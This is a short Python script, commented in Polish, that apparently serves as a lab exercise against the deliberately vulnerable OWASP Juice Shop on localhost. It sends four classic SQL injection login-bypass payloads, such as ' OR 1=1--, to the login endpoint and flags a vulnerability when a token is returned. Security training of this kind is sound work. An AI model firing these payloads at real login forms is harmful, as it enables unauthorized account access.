import requests  #importujemy bibliotekę requests do wysyłania zapytań HTTP

#ustawiamy adres endpointu logowania w aplikacji OWASP Juice Shop (działającej lokalnie na porcie 3000)
url = "http://localhost:3000/rest/user/login"

#lista złośliwych danych logowania, które mogą próbować obejść uwierzytelnianie (klasyczne payloady SQLi)
payloads = [
    {"email": "' OR 1=1--", "password": "irrelevant"},  #prosty warunek zawsze prawdziwy, z komentarzem
    {"email": "' OR '1'='1", "password": "irrelevant"},  #warunek logiczny zawsze prawdziwy
    {"email": "admin@juice-sh.op", "password": "' OR '1'='1"},  #prawidłowy email, ale złośliwe hasło
    {"email": "admin@juice-sh.op' --", "password": "irrelevant"},  #próba przerwania zapytania SQL
]

#iterujemy po liscie
for i, data in enumerate(payloads):
    print(f"[TEST {i+1}] Próba logowania z payloadem: {data}")  #wyświetlamy aktualnie testowane dane

    #wysyłamy żądanie POST do endpointu logowania, z danymi jako JSON
    response = requests.post(url, json=data)

    #sprawdzamy, czy odpowiedź zawiera token, który oznacza poprawne zalogowanie
    if "token" in response.text:
        print("Możliwa podatność na SQL Injection! Zwrócono token logowania.")  # Wskazanie możliwej podatności
    else:
        print("Brak oznak podatności.\n")  # Brak oznak skutecznej próby obejścia logowania
